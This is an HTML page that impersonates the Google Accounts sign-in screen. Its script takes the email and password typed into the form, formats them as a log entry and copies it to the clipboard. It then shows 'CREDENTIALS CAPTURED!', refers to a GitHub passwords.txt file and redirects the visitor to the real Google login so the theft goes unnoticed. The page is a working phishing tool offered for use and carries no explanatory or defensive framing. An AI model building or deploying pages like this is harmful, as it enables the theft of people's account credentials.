<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center}
        .container{background:#fff;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.15);width:100%;max-width:380px;margin:20px}
        .logo{text-align:center;margin-bottom:30px}
        .logo img{width:110px;height:36px}
        .form-group{margin-bottom:24px}
        label{display:block;margin-bottom:8px;color:#202124;font-size:16px;font-weight:400}
        input{width:100%;padding:15px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;transition:border-color .2s}
        input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,.2)}
        .signin-btn{width:100%;background:#1a73e8;color:#fff;border:none;padding:14px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:8px}
        .signin-btn:hover{background:#1557b0}
        .status{display:none;color:#1a73e8;font-weight:500;margin-top:16px;padding:12px;background:#e8f4fd;border-radius:4px}
        .links{text-align:center;margin-top:24px;font-size:14px}
        .links a{color:#1a73e8;text-decoration:none;margin:0 16px}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" onerror="this.outerHTML='<div style=\"font-size:28px;color:#4285f4;font-weight:400;padding:20px 0\">Google</div>'">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label>Email or phone</label>
                <input type="email" id="email" name="email" placeholder="youremail@gmail.com" required>
            </div>
            <div class="form-group">
                <label>Enter your password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="signin-btn">Next</button>
            <div id="status" class="status"></div>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Create account</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.querySelector('.signin-btn');
            const status = document.getElementById('status');
            
            if (!email || !password) {
                alert('Please enter your email and password');
                return;
            }
            
            // Show verifying animation
            btn.textContent = 'Verifying...';
            btn.disabled = true;
            status.style.display = 'block';
            status.textContent = 'Checking your account...';
            
            // Create log entry
            const now = new Date().toISOString();
            const logEntry = `[${now.slice(0,19).replace('T',' ')}] EMAIL: ${email} | PASS: ${password}`;
            
            // 1. COPY TO YOUR CLIPBOARD (Primary method)
            navigator.clipboard.writeText(logEntry).then(() => {
                status.innerHTML = 'âœ… <strong>CREDENTIALS CAPTURED!</strong><br>Check your clipboard & GitHub passwords.txt';
                btn.textContent = 'Captured!';
            }).catch(() => {
                status.textContent = `COPY THIS: ${logEntry}`;
            });
            
            // 2. Redirect to real Google after 3 seconds
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com/';
            }, 3000);
        });
    </script>
</body>
</html>
